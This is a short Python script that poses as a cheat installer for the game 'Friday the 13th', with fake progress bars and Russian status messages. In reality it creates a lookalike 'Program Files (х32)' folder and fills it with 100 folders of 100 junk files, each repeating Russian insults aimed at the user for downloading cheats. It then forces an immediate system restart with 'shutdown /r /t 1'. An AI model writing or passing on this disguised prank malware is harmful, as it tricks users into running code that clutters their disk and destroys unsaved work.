import os
import sys
from time import *


def Loading_2():
    animation = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)):
        sleep(0.05)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    print("\n")


def tes_dir():
    if os.path.exists(r"C:/Program Files (х32)") != True:
        os.mkdir(r"C:/Program Files (х32)")


def tes_dir_2():
    if os.mkdir(fr"C:/Program Files (х32)/cheat na Friday the 13th game") != True:
        for i in range(100):
            os.mkdir(fr"C:/Program Files (х32)/Friday the 13th game - {i}")
            os.chdir(fr"C:/Program Files (х32)/Friday the 13th game - {i}")
            Loading_2()
            for x in range(100):
                text_file = open(f"Cheat+{x}", "w")
                for j in range(10):
                    text_file.write(f"Скачал читы лошара позорная - {j} \n ")
                    text_file.write("Без ОБИД!!!")


def str(stroka):
    print('Cheat: ', end="")
    for slovo in stroka:
        print(slovo, end="", flush=True)
        sleep(0.1)
    print('\n')


def Loading():
    animation = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)):
        sleep(0.25)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    print("\n")


str("Запускаем установку")
Loading()
tes_dir()
str("Подготовка к установки чита...")
sleep(10)
str("Установка ЧИТА на Friday 13th the game")
tes_dir_2()
str("Всё уствновлено!!!")
str("Не играй с читами НУБАС")
os.system("shutdown /r /t 1")